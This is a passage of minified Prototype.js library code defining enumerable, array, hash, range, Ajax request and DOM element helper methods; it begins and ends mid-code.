array;for(;(index+=number)<array.length;)slices.push(array.slice(index,index+number));return slices.collect(iterator,context)},all:all,every:all,any:any,some:any,collect:collect,map:collect,detect:detect,findAll:findAll,select:findAll,filter:findAll,grep:function grep(filter,iterator,context){iterator=iterator||Prototype.K;var results=[];return Object.isString(filter)&&(filter=new RegExp(RegExp.escape(filter))),this.each((function(value,index){filter.match(value)&&results.push(iterator.call(context,value,index,this))}),this),results},include:include,member:include,inGroupsOf:function inGroupsOf(number,fillWith){return fillWith=Object.isUndefined(fillWith)?null:fillWith,this.eachSlice(number,(function(slice){for(;slice.length<number;)slice.push(fillWith);return slice}))},inject:function inject(memo,iterator,context){return this.each((function(value,index){memo=iterator.call(context,memo,value,index,this)}),this),memo},invoke:function invoke(method){var args=$A(arguments).slice(1);return this.map((function(value){return value[method].apply(value,args)}))},max:function max(iterator,context){var result;return iterator=iterator||Prototype.K,this.each((function(value,index){value=iterator.call(context,value,index,this),(null==result||value>=result)&&(result=value)}),this),result},min:function min(iterator,context){var result;return iterator=iterator||Prototype.K,this.each((function(value,index){value=iterator.call(context,value,index,this),(null==result||value<result)&&(result=value)}),this),result},partition:function partition(iterator,context){iterator=iterator||Prototype.K;var trues=[],falses=[];return this.each((function(value,index){(iterator.call(context,value,index,this)?trues:falses).push(value)}),this),[trues,falses]},pluck:function pluck(property){var results=[];return this.each((function(value){results.push(value[property])})),results},reject:function reject(iterator,context){var results=[];return this.each((function(value,index){iterator.call(context,value,index,this)||results.push(value)}),this),results},sortBy:function sortBy(iterator,context){return this.map((function(value,index){return{value:value,criteria:iterator.call(context,value,index,this)}}),this).sort((function(left,right){var a=left.criteria,b=right.criteria;return a<b?-1:a>b?1:0})).pluck("value")},toArray:toArray,entries:toArray,zip:function zip(){var iterator=Prototype.K,args=$A(arguments);Object.isFunction(args.last())&&(iterator=args.pop());var collections=[this].concat(args).map($A);return this.map((function(value,index){return iterator(collections.pluck(index))}))},size:function size(){return this.toArray().length},inspect:function inspect(){return"#<Enumerable:"+this.toArray().inspect()+">"},find:detect}}();function $A(iterable){if(!iterable)return[];if("toArray"in Object(iterable))return iterable.toArray();for(var length=iterable.length||0,results=new Array(length);length--;)results[length]=iterable[length];return results}function $w(string){return Object.isString(string)&&(string=string.strip())?string.split(/\s+/):[]}function $H(object){return new Hash(object)}Array.from=Array.from||$A,function(){var arrayProto=Array.prototype,slice=arrayProto.slice,_each=arrayProto.forEach;function clone(){return slice.call(this,0)}function wrapNative(method){return function(){if(0===arguments.length)return method.call(this,Prototype.K);if(void 0===arguments[0]){var args=slice.call(arguments,1);return args.unshift(Prototype.K),method.apply(this,args)}return method.apply(this,arguments)}}function map(iterator){if(null==this)throw new TypeError;iterator=iterator||Prototype.K;for(var object=Object(this),results=[],context=arguments[1],n=0,i=0,length=object.length>>>0;i<length;i++)i in object&&(results[n]=iterator.call(context,object[i],i,object)),n++;return results.length=n,results}function filter(iterator){if(null==this||!Object.isFunction(iterator))throw new TypeError;for(var value,object=Object(this),results=[],context=arguments[1],i=0,length=object.length>>>0;i<length;i++)i in object&&(value=object[i],iterator.call(context,value,i,object)&&results.push(value));return results}function some(iterator){if(null==this)throw new TypeError;iterator=iterator||Prototype.K;for(var context=arguments[1],object=Object(this),i=0,length=object.length>>>0;i<length;i++)if(i in object&&iterator.call(context,object[i],i,object))return!0;return!1}function every(iterator){if(null==this)throw new TypeError;iterator=iterator||Prototype.K;for(var context=arguments[1],object=Object(this),i=0,length=object.length>>>0;i<length;i++)if(i in object&&!iterator.call(context,object[i],i,object))return!1;return!0}_each||(_each=function each(iterator,context){for(var i=0,length=this.length>>>0;i<length;i++)i in this&&iterator.call(context,this[i],i,this)}),arrayProto.map&&(map=wrapNative(Array.prototype.map)),arrayProto.filter&&(filter=Array.prototype.filter),arrayProto.some&&(some=wrapNative(Array.prototype.some)),arrayProto.every&&(every=wrapNative(Array.prototype.every)),Object.extend(arrayProto,Enumerable),arrayProto.entries===Enumerable.entries&&delete arrayProto.entries,arrayProto._reverse||(arrayProto._reverse=arrayProto.reverse),Object.extend(arrayProto,{_each:_each,map:map,collect:map,select:filter,filter:filter,findAll:filter,some:some,any:some,every:every,all:every,clear:function clear(){return this.length=0,this},first:function first(){return this[0]},last:function last(){return this[this.length-1]},compact:function compact(){return this.select((function(value){return null!=value}))},flatten:function flatten(){return this.inject([],(function(array,value){return Object.isArray(value)?array.concat(value.flatten()):(array.push(value),array)}))},without:function without(){var values=slice.call(arguments,0);return this.select((function(value){return!values.include(value)}))},reverse:function reverse(inline){return(!1===inline?this.toArray():this)._reverse()},uniq:function uniq(sorted){return this.inject([],(function(array,value,index){return 0!=index&&(sorted?array.last()==value:array.include(value))||array.push(value),array}))},intersect:function intersect(array){return this.uniq().findAll((function(item){return-1!==array.indexOf(item)}))},clone:clone,toArray:clone,size:function size(){return this.length},inspect:function inspect(){return"["+this.map(Object.inspect).join(", ")+"]"}});var CONCAT_ARGUMENTS_BUGGY=function(){return 1!==[].concat(arguments)[0][0]}(1,2);CONCAT_ARGUMENTS_BUGGY&&(arrayProto.concat=function concat(_){var item,array=[],items=slice.call(arguments,0),n=0;items.unshift(this);for(var i=0,length=items.length;i<length;i++)if(item=items[i],Object.isArray(item)&&!("callee"in item))for(var j=0,arrayLength=item.length;j<arrayLength;j++)j in item&&(array[n]=item[j]),n++;else array[n++]=item;return array.length=n,array}),arrayProto.indexOf||(arrayProto.indexOf=function indexOf(item,i){if(null==this)throw new TypeError;var array=Object(this),length=array.length>>>0;if(0===length)return-1;if(i=Number(i),isNaN(i)?i=0:0!==i&&isFinite(i)&&(i=(i>0?1:-1)*Math.floor(Math.abs(i))),i>length)return-1;for(var k=i>=0?i:Math.max(length-Math.abs(i),0);k<length;k++)if(k in array&&array[k]===item)return k;return-1}),arrayProto.lastIndexOf||(arrayProto.lastIndexOf=function lastIndexOf(item,i){if(null==this)throw new TypeError;var array=Object(this),length=array.length>>>0;if(0===length)return-1;Object.isUndefined(i)?i=length:(i=Number(i),isNaN(i)?i=0:0!==i&&isFinite(i)&&(i=(i>0?1:-1)*Math.floor(Math.abs(i))));for(var k=i>=0?Math.min(i,length-1):length-Math.abs(i);k>=0;k--)if(k in array&&array[k]===item)return k;return-1})}();var Hash=Class.create(Enumerable,function(){function toObject(){return Object.clone(this._object)}function toQueryPair(key,value){return Object.isUndefined(value)?key:(value=(value=String.interpret(value)).gsub(/(\r)?\n/,"\r\n"),key+"="+(value=(value=encodeURIComponent(value)).gsub(/%20/,"+")))}return{initialize:function initialize(object){this._object=Object.isHash(object)?object.toObject():Object.clone(object)},_each:function _each(iterator,context){var i=0;for(var key in this._object){var value=this._object[key],pair=[key,value];pair.key=key,pair.value=value,iterator.call(context,pair,i),i++}},set:function set(key,value){return this._object[key]=value},get:function get(key){if(this._object[key]!==Object.prototype[key])return this._object[key]},unset:function unset(key){var value=this._object[key];return delete this._object[key],value},toObject:toObject,toTemplateReplacements:toObject,keys:function keys(){return this.pluck("key")},values:function values(){return this.pluck("value")},index:function index(value){var match=this.detect((function(pair){return pair.value===value}));return match&&match.key},merge:function merge(object){return this.clone().update(object)},update:function update(object){return new Hash(object).inject(this,(function(result,pair){return result.set(pair.key,pair.value),result}))},toQueryString:function toQueryString(){return this.inject([],(function(results,pair){var key=encodeURIComponent(pair.key),values=pair.value;if(values&&"object"==typeof values){if(Object.isArray(values)){for(var value,queryValues=[],i=0,len=values.length;i<len;i++)value=values[i],queryValues.push(toQueryPair(key,value));return results.concat(queryValues)}}else results.push(toQueryPair(key,values));return results})).join("&")},inspect:function inspect(){return"#<Hash:{"+this.map((function(pair){return pair.map(Object.inspect).join(": ")})).join(", ")+"}>"},toJSON:toObject,clone:function clone(){return new Hash(this)}}}());function $R(start,end,exclusive){return new ObjectRange(start,end,exclusive)}Hash.from=$H,Object.extend(Number.prototype,{toColorPart:function toColorPart(){return this.toPaddedString(2,16)},succ:function succ(){return this+1},times:function times(iterator,context){return $R(0,this,!0).each(iterator,context),this},toPaddedString:function toPaddedString(length,radix){var string=this.toString(radix||10);return"0".times(length-string.length)+string},abs:function abs(){return Math.abs(this)},round:function round(){return Math.round(this)},ceil:function ceil(){return Math.ceil(this)},floor:function floor(){return Math.floor(this)}});var ObjectRange=Class.create(Enumerable,{initialize:function initialize(start,end,exclusive){this.start=start,this.end=end,this.exclusive=exclusive},_each:function _each(iterator,context){var i,value=this.start;for(i=0;this.include(value);i++)iterator.call(context,value,i),value=value.succ()},include:function include(value){return!(value<this.start)&&(this.exclusive?value<this.end:value<=this.end)}}),Abstract={},Try={these:function(){for(var returnValue,i=0,length=arguments.length;i<length;i++){var lambda=arguments[i];try{returnValue=lambda();break}catch(e){}}return returnValue}},Ajax={getTransport:function(){return Try.these((function(){return new XMLHttpRequest}),(function(){return new ActiveXObject("Msxml2.XMLHTTP")}),(function(){return new ActiveXObject("Microsoft.XMLHTTP")}))||!1},activeRequestCount:0};Ajax.Responders={responders:[],_each:function(iterator,context){this.responders._each(iterator,context)},register:function(responder){this.include(responder)||this.responders.push(responder)},unregister:function(responder){this.responders=this.responders.without(responder)},dispatch:function(callback,request,transport,json){this.each((function(responder){if(Object.isFunction(responder[callback]))try{responder[callback].apply(responder,[request,transport,json])}catch(e){}}))}},Object.extend(Ajax.Responders,Enumerable),Ajax.Responders.register({onCreate:function(){Ajax.activeRequestCount++},onComplete:function(){Ajax.activeRequestCount--}}),Ajax.Base=Class.create({initialize:function(options){this.options={method:"post",asynchronous:!0,contentType:"application/x-www-form-urlencoded",encoding:"UTF-8",parameters:"",evalJSON:!0,evalJS:!0},Object.extend(this.options,options||{}),this.options.method=this.options.method.toLowerCase(),Object.isHash(this.options.parameters)&&(this.options.parameters=this.options.parameters.toObject())}}),Ajax.Request=Class.create(Ajax.Base,{_complete:!1,initialize:function($super,url,options){$super(options),this.transport=Ajax.getTransport(),this.request(url)},request:function(url){this.url=url,this.method=this.options.method;var params=Object.isString(this.options.parameters)?this.options.parameters:Object.toQueryString(this.options.parameters);["get","post"].include(this.method)||(params+=(params?"&":"")+"_method="+this.method,this.method="post"),params&&"get"===this.method&&(this.url+=(this.url.include("?")?"&":"?")+params),this.parameters=params.toQueryParams();try{var response=new Ajax.Response(this);this.options.onCreate&&this.options.onCreate(response),Ajax.Responders.dispatch("onCreate",this,response),this.transport.open(this.method.toUpperCase(),this.url,this.options.asynchronous),this.options.asynchronous&&this.respondToReadyState.bind(this).defer(1),this.transport.onreadystatechange=this.onStateChange.bind(this),this.setRequestHeaders(),this.body="post"==this.method?this.options.postBody||params:null,this.transport.send(this.body),!this.options.asynchronous&&this.transport.overrideMimeType&&this.onStateChange()}catch(e){this.dispatchException(e)}},onStateChange:function(){var readyState=this.transport.readyState;readyState>1&&(4!=readyState||!this._complete)&&this.respondToReadyState(this.transport.readyState)},setRequestHeaders:function(){var headers={"X-Requested-With":"XMLHttpRequest","X-Prototype-Version":Prototype.Version,Accept:"text/javascript, text/html, application/xml, text/xml, */*"};if("post"==this.method&&(headers["Content-type"]=this.options.contentType+(this.options.encoding?"; charset="+this.options.encoding:""),this.transport.overrideMimeType&&(navigator.userAgent.match(/Gecko\/(\d{4})/)||[0,2005])[1]<2005&&(headers.Connection="close")),"object"==typeof this.options.requestHeaders){var extras=this.options.requestHeaders;if(Object.isFunction(extras.push))for(var i=0,length=extras.length;i<length;i+=2)headers[extras[i]]=extras[i+1];else $H(extras).each((function(pair){headers[pair.key]=pair.value}))}for(var name in headers)null!=headers[name]&&this.transport.setRequestHeader(name,headers[name])},success:function(){var status=this.getStatus();return!status||status>=200&&status<300||304==status},getStatus:function(){try{return 1223===this.transport.status?204:this.transport.status||0}catch(e){return 0}},respondToReadyState:function(readyState){var state=Ajax.Request.Events[readyState],response=new Ajax.Response(this);if("Complete"==state){try{this._complete=!0,(this.options["on"+response.status]||this.options["on"+(this.success()?"Success":"Failure")]||Prototype.emptyFunction)(response,response.headerJSON)}catch(e){this.dispatchException(e)}var contentType=response.getHeader("Content-type");("force"==this.options.evalJS||this.options.evalJS&&this.isSameOrigin()&&contentType&&contentType.match(/^\s*(text|application)\/(x-)?(java|ecma)script(;.*)?\s*$/i))&&this.evalResponse()}try{(this.options["on"+state]||Prototype.emptyFunction)(response,response.headerJSON),Ajax.Responders.dispatch("on"+state,this,response,response.headerJSON)}catch(e){this.dispatchException(e)}"Complete"==state&&(this.transport.onreadystatechange=Prototype.emptyFunction)},isSameOrigin:function(){var m=this.url.match(/^\s*https?:\/\/[^\/]*/);return!m||m[0]=="#{protocol}//#{domain}#{port}".interpolate({protocol:location.protocol,domain:document.domain,port:location.port?":"+location.port:""})},getHeader:function(name){try{return this.transport.getResponseHeader(name)||null}catch(e){return null}},evalResponse:function(){try{return eval((this.transport.responseText||"").unfilterJSON())}catch(e){this.dispatchException(e)}},dispatchException:function(exception){(this.options.onException||Prototype.emptyFunction)(this,exception),Ajax.Responders.dispatch("onException",this,exception)}}),Ajax.Request.Events=["Uninitialized","Loading","Loaded","Interactive","Complete"],Ajax.Response=Class.create({initialize:function(request){this.request=request;var transport=this.transport=request.transport,readyState=this.readyState=transport.readyState;if((readyState>2&&!Prototype.Browser.IE||4==readyState)&&(this.status=this.getStatus(),this.statusText=this.getStatusText(),this.responseText=String.interpret(transport.responseText),this.headerJSON=this._getHeaderJSON()),4==readyState){var xml=transport.responseXML;this.responseXML=Object.isUndefined(xml)?null:xml,this.responseJSON=this._getResponseJSON()}},status:0,statusText:"",getStatus:Ajax.Request.prototype.getStatus,getStatusText:function(){try{return this.transport.statusText||""}catch(e){return""}},getHeader:Ajax.Request.prototype.getHeader,getAllHeaders:function(){try{return this.getAllResponseHeaders()}catch(e){return null}},getResponseHeader:function(name){return this.transport.getResponseHeader(name)},getAllResponseHeaders:function(){return this.transport.getAllResponseHeaders()},_getHeaderJSON:function(){var json=this.getHeader("X-JSON");if(!json)return null;try{json=decodeURIComponent(escape(json))}catch(e){}try{return json.evalJSON(this.request.options.sanitizeJSON||!this.request.isSameOrigin())}catch(e){this.request.dispatchException(e)}},_getResponseJSON:function(){var options=this.request.options;if(!options.evalJSON||"force"!=options.evalJSON&&!(this.getHeader("Content-type")||"").include("application/json")||this.responseText.blank())return null;try{return this.responseText.evalJSON(options.sanitizeJSON||!this.request.isSameOrigin())}catch(e){this.request.dispatchException(e)}}}),Ajax.Updater=Class.create(Ajax.Request,{initialize:function($super,container,url,options){this.container={success:container.success||container,failure:container.failure||(container.success?null:container)};var onComplete=(options=Object.clone(options)).onComplete;options.onComplete=function(response,json){this.updateContent(response.responseText),Object.isFunction(onComplete)&&onComplete(response,json)}.bind(this),$super(url,options)},updateContent:function(responseText){var receiver=this.container[this.success()?"success":"failure"],options=this.options;if(options.evalScripts||(responseText=responseText.stripScripts()),receiver=$(receiver))if(options.insertion)if(Object.isString(options.insertion)){var insertion={};insertion[options.insertion]=responseText,receiver.insert(insertion)}else options.insertion(receiver,responseText);else receiver.update(responseText)}}),Ajax.PeriodicalUpdater=Class.create(Ajax.Base,{initialize:function($super,container,url,options){$super(options),this.onComplete=this.options.onComplete,this.frequency=this.options.frequency||2,this.decay=this.options.decay||1,this.updater={},this.container=container,this.url=url,this.start()},start:function(){this.options.onComplete=this.updateComplete.bind(this),this.onTimerEvent()},stop:function(){this.updater.options.onComplete=void 0,clearTimeout(this.timer),(this.onComplete||Prototype.emptyFunction).apply(this,arguments)},updateComplete:function(response){this.options.decay&&(this.decay=response.responseText==this.lastText?this.decay*this.options.decay:1,this.lastText=response.responseText),this.timer=this.onTimerEvent.bind(this).delay(this.decay*this.frequency)},onTimerEvent:function(){this.updater=new Ajax.Updater(this.container,this.url,this.options)}}),function(GLOBAL){var UNDEFINED,SLICE=Array.prototype.slice,DIV=document.createElement("div");function $(element){if(arguments.length>1){for(var i=0,elements=[],length=arguments.length;i<length;i++)elements.push($(arguments[i]));return elements}return Object.isString(element)&&(element=document.getElementById(element)),Element.extend(element)}GLOBAL.$=$,GLOBAL.Node||(GLOBAL.Node={}),GLOBAL.Node.ELEMENT_NODE||Object.extend(GLOBAL.Node,{ELEMENT_NODE:1,ATTRIBUTE_NODE:2,TEXT_NODE:3,CDATA_SECTION_NODE:4,ENTITY_REFERENCE_NODE:5,ENTITY_NODE:6,PROCESSING_INSTRUCTION_NODE:7,COMMENT_NODE:8,DOCUMENT_NODE:9,DOCUMENT_TYPE_NODE:10,DOCUMENT_FRAGMENT_NODE:11,NOTATION_NODE:12});var ELEMENT_CACHE={};var HAS_EXTENDED_CREATE_ELEMENT_SYNTAX=function(){try{var el=document.createElement('<input name="x">');return"input"===el.tagName.toLowerCase()&&"x"===el.name}catch(err){return!1}}(),oldElement=GLOBAL.Element;function Element(tagName,attributes){if(attributes=attributes||{},tagName=tagName.toLowerCase(),HAS_EXTENDED_CREATE_ELEMENT_SYNTAX&&attributes.name)return tagName="<"+tagName+' name="'+attributes.name+'">',delete attributes.name,Element.writeAttribute(document.createElement(tagName),attributes);ELEMENT_CACHE[tagName]||(ELEMENT_CACHE[tagName]=Element.extend(document.createElement(tagName)));var node=function shouldUseCreationCache(tagName,attributes){return"select"!==tagName&&!("type"in attributes)}(tagName,attributes)?ELEMENT_CACHE[tagName].cloneNode(!1):document.createElement(tagName);return Element.writeAttribute(node,attributes)}GLOBAL.Element=Element,Object.extend(GLOBAL.Element,oldElement||{}),oldElement&&(GLOBAL.Element.prototype=oldElement.prototype),Element.Methods={ByTag:{},Simulated:{}};var methods={},INSPECT_ATTRIBUTES={id:"id",className:"class"};methods.inspect=function inspect(element){var attribute,value,result="<"+(element=$(element)).tagName.toLowerCase();for(var property in INSPECT_ATTRIBUTES)attribute=INSPECT_ATTRIBUTES[property],(value=(element[property]||"").toString())&&(result+=" "+attribute+"="+value.inspect(!0));return result+">"},Object.extend(methods,{visible:function visible(element){return"none"!==$(element).getStyle("display")},toggle:function toggle(element,bool){return element=$(element),"boolean"!=typeof bool&&(bool=!Element.visible(element)),Element[bool?"show":"hide"](element),element},hide:function hide(element){return(element=$(element)).style.display="none",element},show:function show(element){return(element=$(element)).style.display="",element}});var el,isBuggy,SELECT_ELEMENT_INNERHTML_BUGGY=(el=document.createElement("select"),isBuggy=!0,el.innerHTML='<option value="test">test</option>',el.options&&el.options[0]&&(isBuggy="OPTION"!==el.options[0].nodeName.toUpperCase()),el=null,isBuggy),TABLE_ELEMENT_INNERHTML_BUGGY=function(){try{var el=document.createElement("table");if(el&&el.tBodies){el.innerHTML="<tbody><tr><td>test</td></tr></tbody>";var isBuggy=void 0===el.tBodies[0];return el=null,isBuggy}}catch(e){return!0}}(),LINK_ELEMENT_INNERHTML_BUGGY=function(){try{var el=document.createElement("div");el.innerHTML="<link />";var isBuggy=0===el.childNodes.length;return el=null,isBuggy}catch(e){return!0}}(),ANY_INNERHTML_BUGGY=SELECT_ELEMENT_INNERHTML_BUGGY||TABLE_ELEMENT_INNERHTML_BUGGY||LINK_ELEMENT_INNERHTML_BUGGY,SCRIPT_ELEMENT_REJECTS_TEXTNODE_APPENDING=function(){var s=document.createElement("script"),isBuggy=!1;try{s.appendChild(document.createTextNode("")),isBuggy=!s.firstChild||s.firstChild&&3!==s.firstChild.nodeType}catch(e){isBuggy=!0}return s=null,isBuggy}();function replace(element,content){if(element=$(element),content&&content.toElement)content=content.toElement();else if(!Object.isElement(content)){content=Object.toHTML(content);var range=element.ownerDocument.createRange();range.selectNode(element),content.evalScripts.bind(content).defer(),content=range.createContextualFragment(content.stripScripts())}return element.parentNode.replaceChild(content,element),element}var descendantOf,INSERTION_TRANSLATIONS={before:function(element,node){element.parentNode.insertBefore(node,element)},top:function(element,node){element.insertBefore(node,element.firstChild)},bottom:function(element,node){element.appendChild(node)},after:function(element,node){element.parentNode.insertBefore(node,element.nextSibling)},tags:{TABLE:["<table>","</table>",1],TBODY:["<table><tbody>","</tbody></table>",2],TR:["<table><tbody><tr>","</tr></tbody></table>",3],TD:["<table><tbody><tr><td>","</td></tr></tbody></table>",4],SELECT:["<select>","</select>",1]}},tags=INSERTION_TRANSLATIONS.tags;function insertContentAt(element,content,position){position=position.toLowerCase();var method=INSERTION_TRANSLATIONS[position];if(content&&content.toElement&&(content=content.toElement()),Object.isElement(content))return method(element,content),element;content=Object.toHTML(content);var childNodes=getContentFromAnonymousElement(("before"===position||"after"===position?element.parentNode:element).tagName.toUpperCase(),content.stripScripts());"top"!==position&&"after"!==position||childNodes.reverse();for(var node,i=0;node=childNodes[i];i++)method(element,node);content.evalScripts.bind(content).defer()}function getContentFromAnonymousElement(tagName,html,force){var t=INSERTION_TRANSLATIONS.tags[tagName],div=DIV,workaround=!!t;if(!workaround&&force&&(workaround=!0,t=["","",0]),workaround){div.innerHTML="&#160;"+t[0]+html+t[1],div.removeChild(div.firstChild);for(var i=t[2];i--;)div=div.firstChild}else div.innerHTML=html;return $A(div.childNodes)}function purgeElement(element){var uid=getUniqueElementID(element);uid&&(Element.stopObserving(element),HAS_UNIQUE_ID_PROPERTY||(element._prototypeUID=UNDEFINED),delete Element.Storage[uid])}function recursivelyCollect(element,property,maximumLength){element=$(element),maximumLength=maximumLength||-1;for(var elements=[];(element=element[property])&&(element.nodeType===Node.ELEMENT_NODE&&elements.push(Element.extend(element)),elements.length!==maximumLength););return elements}function firstDescendant(element){for(element=$(element).firstChild;element&&element.nodeType!==Node.ELEMENT_NODE;)element=element.nextSibling;return $(element)}function immediateDescendants(element){for(var results=[],child=$(element).firstChild;child;)child.nodeType===Node.ELEMENT_NODE&&results.push(Element.extend(child)),child=child.nextSibling;return results}function previousSiblings(element){return recursivelyCollect(element,"previousSibling")}function nextSiblings(element){return recursivelyCollect(element,"nextSibling")}function _recursivelyFind(element,property,expression,index){for(element=$(element),expression=expression||0,index=index||0,Object.isNumber(expression)&&(index=expression,expression=null);element=element[property];)if(1===element.nodeType&&(!expression||Prototype.Selector.match(element,expression))&&!(--index>=0))return Element.extend(element)}function select(element){element=$(element);var expressions=SLICE.call(arguments,1).join(", ");return Prototype.Selector.select(expressions,element)}function descendantOf_DOM(element,ancestor){if(element=$(element),ancestor=$(ancestor),!element||!ancestor)return!1;for(;element=element.parentNode;)if(element===ancestor)return!0;return!1}Object.extend(tags,{THEAD:tags.TBODY,TFOOT:tags.TBODY,TH:tags.TD}),"outerHTML"in document.documentElement&&(replace=function replace_IE(element,content){if(element=$(element),content&&content.toElement&&(content=content.toElement()),Object.isElement(content))return element.parentNode.replaceChild(content,element),element;content=Object.toHTML(content);var parent=element.parentNode,tagName=parent.tagName.toUpperCase();if(tagName in INSERTION_TRANSLATIONS.tags){var iterator,nextSibling=Element.next(element),fragments=getContentFromAnonymousElement(tagName,content.stripScripts());parent.removeChild(element),iterator=nextSibling?function(node){parent.insertBefore(node,nextSibling)}:function(node){parent.appendChild(node)},fragments.each(iterator)}else element.outerHTML=content.stripScripts();return content.evalScripts.bind(content).defer(),element}),Object.extend(methods,{remove:function remove(element){return(element=$(element)).parentNode.removeChild(element),element},update:function update(element,content){for(var descendants=(element=$(element)).getElementsByTagName("*"),i=descendants.length;i--;)purgeElement(descendants[i]);if(content&&content.toElement&&(content=content.toElement()),Object.isElement(content))return element.update().insert(content);content=Object.toHTML(content);var tagName=element.tagName.toUpperCase();if("SCRIPT"===tagName&&SCRIPT_ELEMENT_REJECTS_TEXTNODE_APPENDING)return element.text=content,element;if(ANY_INNERHTML_BUGGY)if(tagName in INSERTION_TRANSLATIONS.tags){for(;element.firstChild;)element.removeChild(element.firstChild);var nodes=getContentFromAnonymousElement(tagName,content.stripScripts());for(i=0;node=nodes[i];i++)element.appendChild(node)}else if(LINK_ELEMENT_INNERHTML_BUGGY&&Object.isString(content)&&content.indexOf("<link")>-1){for(;element.firstChild;)element.removeChild(element.firstChild);var node;for(nodes=getContentFromAnonymousElement(tagName,content.stripScripts(),!0),i=0;node=nodes[i];i++)element.appendChild(node)}else element.innerHTML=content.stripScripts();else element.innerHTML=content.stripScripts();return content.evalScripts.bind(content).defer(),element},replace:replace,insert:function insert(element,insertions){for(var position in element=$(element),function isContent(content){return!(Object.isUndefined(content)||null===content||!Object.isString(content)&&!Object.isNumber(content)&&!Object.isElement(content)&&!content.toElement&&!content.toHTML)}(insertions)&&(insertions={bottom:insertions}),insertions)insertContentAt(element,insertions[position],position);return element},wrap:function wrap(element,wrapper,attributes){return element=$(element),Object.isElement(wrapper)?$(wrapper).writeAttribute(attributes||{}):wrapper=Object.isString(wrapper)?new Element(wrapper,attributes):new Element("div",wrapper),element.parentNode&&element.parentNode.replaceChild(wrapper,element),wrapper.appendChild(element),wrapper},cleanWhitespace:function cleanWhitespace(element){for(var node=(element=$(element)).firstChild;node;){var nextNode=node.nextSibling;node.nodeType!==Node.TEXT_NODE||/\S/.test(node.nodeValue)||element.removeChild(node),node=nextNode}return element},empty:function empty(element){return $(element).innerHTML.blank()},clone:function clone(element,deep){if(element=$(element)){var clone=element.cloneNode(deep);if(!HAS_UNIQUE_ID_PROPERTY&&(clone._prototypeUID=UNDEFINED,deep))for(var descendants=Element.select(clone,"*"),i=descendants.length;i--;)descendants[i]._prototypeUID=UNDEFINED;return Element.extend(clone)}},purge:function purge(element){if(element=$(element)){purgeElement(element);for(var descendants=element.getElementsByTagName("*"),i=descendants.length;i--;)purgeElement(descendants[i]);return null}}}),descendantOf=DIV.compareDocumentPosition?function descendantOf_compareDocumentPosition(element,ancestor){return element=$(element),ancestor=$(ancestor),!(!element||!ancestor)&&8==(8&element.compareDocumentPosition(ancestor))}:DIV.contains?function descendantOf_contains(element,ancestor){return element=$(element),ancestor=$(ancestor),!(!element||!ancestor)&&(ancestor.contains?ancestor.contains(element)&&ancestor!==element:descendantOf_DOM(element,ancestor))}:descendantOf_DOM,Object.extend(methods,{recursivelyCollect:recursivelyCollect,ancestors:function ancestors(element){return recursivelyCollect(element,"parentNode")},descendants:function descendants(element){return Element.select(element,"*")},firstDescendant:firstDescendant,immediateDescendants:immediateDescendants,previousSiblings:previousSiblings,nextSiblings:nextSiblings,siblings:function siblings(element){var previous=previousSiblings(element=$(element)),next=nextSiblings(element);return previous.reverse().concat(next)},match:function match(element,selector){return element=$(element),Object.isString(selector)?Prototype.Selector.match(element,selector):selector.match(element)},up:function up(element,expression,index){return element=$(element),1===arguments.length?$(element.parentNode):_recursivelyFind(element,"parentNode",expression,index)},down:function down(element,expression,index){if(1===arguments.length)return firstDescendant(element);element=$(element),expression=expression||0,index=index||0,Object.isNumber(expression)&&(index=expression,expression="*");var node=Prototype.Selector.select(expression,element)[index];return Element.extend(node)},previous:function previous(element,expression,index){return _recursivelyFind(element,"previousSibling",expression,index)},next:function next(element,expression,index){return _recursivelyFind(element,"nextSibling",expression,index)},select:select,adjacent:function adjacent(element){element=$(element);for(var sibling,expressions=SLICE.call(arguments,1).join(", "),siblings=Element.siblings(element),results=[],i=0;sibling=siblings[i];i++)Prototype.Selector.match(sibling,expressions)&&results.push(sibling);return results},descendantOf:descendantOf,getElementsBySelector:select,childElements:immediateDescendants});var idCounter=1;function readAttribute(element,name){return $(element).getAttribute(name)}(function(){DIV.setAttribute("onclick",[]);var value=DIV.getAttribute("onclick"),isFunction=Object.isArray(value);return DIV.removeAttribute("onclick"),isFunction})()?readAttribute=function readAttribute_IE(element,name){element=$(element);var table=ATTRIBUTE_TRANSLATIONS.read;return table.values[name]?table.values[name](element,name):(table.names[name]&&(name=table.names[name]),name.include(":")?element.attributes&&element.attributes[name]?element.attributes[name].value:null:element.getAttribute(name))}:Prototype.Browser.Opera&&(readAttribute=function readAttribute_Opera(element,name){return"title"===name?element.title:element.getAttribute(name)});var PROBLEMATIC_HAS_ATTRIBUTE_WITH_CHECKBOXES=function(){if(!HAS_EXTENDED_CREATE_ELEMENT_SYNTAX)return!1;var checkbox=document.createElement('<input type="checkbox">');checkbox.checked=!0;var node=checkbox.getAttributeNode("checked");return!node||!node.specified}();function hasAttribute(element,attribute){attribute=ATTRIBUTE_TRANSLATIONS.has[attribute]||attribute;var node=$(element).getAttributeNode(attribute);return!(!node||!node.specified)}GLOBAL.Element.Methods.Simulated.hasAttribute=PROBLEMATIC_HAS_ATTRIBUTE_WITH_CHECKBOXES?function hasAttribute_IE(element,attribute){return"checked"===attribute?element.checked:hasAttribute(element,attribute)}:hasAttribute;var regExpCache={};function getRegExpForClassName(className){if(regExpCache[className])return regExpCache[className];var re=new RegExp("(^|\\s+)"+className+"(\\s+|$)");return regExpCache[className]=re,re}function hasClassName(element,className){if(element=$(element)){var elementClassName=element.className;return 0!==elementClassName.length&&(elementClassName===className||getRegExpForClassName(className).test(elementClassName))}}var ATTRIBUTE_TRANSLATIONS={},classProp="className",forProp="for";DIV.setAttribute(classProp,"x"),"x"!==DIV.className&&(DIV.setAttribute("class","x"),"x"===DIV.className&&(classProp="class"));var LABEL=document.createElement("label");function _getAttr2(element,attribute){return element.getAttribute(attribute,2)}function _getFlag(element,attribute){return $(element).hasAttribute(attribute)?attribute:null}LABEL.setAttribute(forProp,"x"),"x"!==LABEL.htmlFor&&(LABEL.setAttribute("htmlFor","x"),"x"===LABEL.htmlFor&&(forProp="htmlFor")),LABEL=null,DIV.onclick=Prototype.emptyFunction;var _getEv,onclickValue=DIV.getAttribute("onclick");String(onclickValue).indexOf("{")>-1?_getEv=function(element,attribute){var value=element.getAttribute(attribute);return value?(value=(value=(value=value.toString()).split("{")[1]).split("}")[0]).strip():null}:""===onclickValue&&(_getEv=function(element,attribute){var value=element.getAttribute(attribute);return value?value.strip():null}),ATTRIBUTE_TRANSLATIONS.read={names:{class:classProp,className:classProp,for:forProp,htmlFor:forProp},values:{style:function(element){return element.style.cssText.toLowerCase()},title:function(element){return 